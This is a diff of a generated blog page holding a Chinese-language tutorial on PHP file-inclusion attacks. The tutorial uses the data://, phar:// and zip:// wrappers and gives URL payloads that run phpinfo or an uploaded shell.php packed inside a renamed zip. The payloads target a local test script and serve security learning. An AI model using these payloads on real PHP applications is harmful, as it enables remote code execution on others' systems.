+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">/path/to/file.ext
 </span></span><span class="line"><span class="cl">relative/path/to/file.ext
 </span></span><span class="line"><span class="cl">fileInCwd.ext
@@ -531,11 +745,20 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">C:\path\to\winfile.ext
 </span></span><span class="line"><span class="cl">\\smbserver\share\path\to\winfile.ext
 </span></span><span class="line"><span class="cl">file:///path/to/file.ext
-</span></span></code></pre></div><h4 id="data">data://</h4>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="data">data://</h4>
 <p>data:// 是一个数据流封装器 <!-- raw HTML omitted --></p>
 <p>使用格式： <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;
-</span></span></code></pre></div><ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
 <li>协议头：data://，使后面的内容被识别为一个data URI资源 <!-- raw HTML omitted --></li>
 <li>MIME类型，我们在 File upload 中也曾经介绍过，例如text/plain, image/jpeg, image/gif, image/png, etc. <!-- raw HTML omitted --></li>
 <li>编码设置，默认编码为 charset=US=ASCII （自动编码为%xx） <!-- raw HTML omitted --></li>
@@ -543,40 +766,97 @@ if (!doNotTrack) {
 <li>DATA URI所承载的内容（也是我们插入要注入的恶意代码的地方），它可以是纯文本编写的内容，也可以是经过base64编码的内容。 <!-- raw HTML omitted --></li>
 </ol>
 <p>使用条件： <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">allow_url_fopen: on
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">allow_url_fopen: on
 </span></span><span class="line"><span class="cl">allow_url_include: on/off
 </span></span><span class="line"><span class="cl">php版本≥php5.2
-</span></span></code></pre></div><p>需要注意的是，当allow_url_include为on时，任意文件包含就会成为任意命令执行 <!-- raw HTML omitted --></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要注意的是，当allow_url_include为on时，任意文件包含就会成为任意命令执行 <!-- raw HTML omitted --></p>
 <p>利用： <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext:
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext:
 </span></span><span class="line"><span class="cl">?filename=data://text/plain,&lt;?php phpinfo()?&gt;
 </span></span><span class="line"><span class="cl">or encoded by base64:
 </span></span><span class="line"><span class="cl">?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=data://text/plain,&lt;?php phpinfo()?&gt;
-</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-22_09-44-50_screenshot.png" width="700px"/>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=data://text/plain,&lt;?php phpinfo()?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/ox-hugo/2022-05-22_09-44-50_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
 <h4 id="phar">phar://</h4>
 <p>phar只能用在本地文件上，因此我们所举的例子都是在文件上传成功的基础上进行的 <!-- raw HTML omitted --></p>
 <p>使用格式 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=phar://[压缩包名称][/内部文件名称]
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=phar://[压缩包名称][/内部文件名称]
 </span></span><span class="line"><span class="cl">?filename=phar://xxx.png/shell.php
-</span></span></code></pre></div><p>压缩文件可以改为任意后缀 <!-- raw HTML omitted --></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>压缩文件可以改为任意后缀 <!-- raw HTML omitted --></p>
 <p>假设我们通过文件上传漏洞上传了一个叫做 <code>shell.png</code> 的压缩包（一定要用zip压缩，rar不行），然后shell.png解压缩之后是phpinfo.php这个文件 <!-- raw HTML omitted --></p>
 <p>那么我们就可以再利用 <code>phar</code> 来进行解压缩并执行 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=phar://shell.png/phpinfo.php
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=phar://shell.png/phpinfo.php
 </span></span><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=phar://[绝对路径]shell.png/phpinfo.php
-</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-22_09-55-08_screenshot.png" width="700px"/>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/ox-hugo/2022-05-22_09-55-08_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
 <h4 id="zip">zip://</h4>
 <p>用法与phar有所不同 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
 </span></span><span class="line"><span class="cl">?filename=zip://xxx.png#shell.php。
-</span></span></code></pre></div><p>条件： PHP &gt; =5.3.0，注意在windows下测试要 5.3.0&lt;PHP&lt;5.4 才可以 <!-- raw HTML omitted -->
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>条件： PHP &gt; =5.3.0，注意在windows下测试要 5.3.0&lt;PHP&lt;5.4 才可以 <!-- raw HTML omitted -->
 同时，#在url中要编码为%23，否则浏览器默认不会传输特殊字符。 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=zip://[absolute_path]shell.png%23phpinfo.php
-</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-22_10-01-54_screenshot.png" width="700px"/>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=zip://[absolute_path]shell.png%23phpinfo.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/ox-hugo/2022-05-22_10-01-54_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
 <h3 id="reference">Reference</h3>
@@ -669,18 +949,6 @@ if (!doNotTrack) {
             
                 
 <article class="">
-    <a href="/posts/mysql_tricks/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Mysql中的“奇技淫巧”</h2>
-        </div>
-    </a>
-</article>
-            
-                
-<article class="">
     <a href="/posts/ssti_twig/">
         
         
@@ -723,6 +991,18 @@ if (!doNotTrack) {
 
         <div class="article-details">
             <h2 class="article-title">如何利用PHP查询字符串解释器来绕过IDPS以及WAF</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/php_bypass_tricks/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP特性绕过技巧</h2>
         </div>
     </a>
 </article>
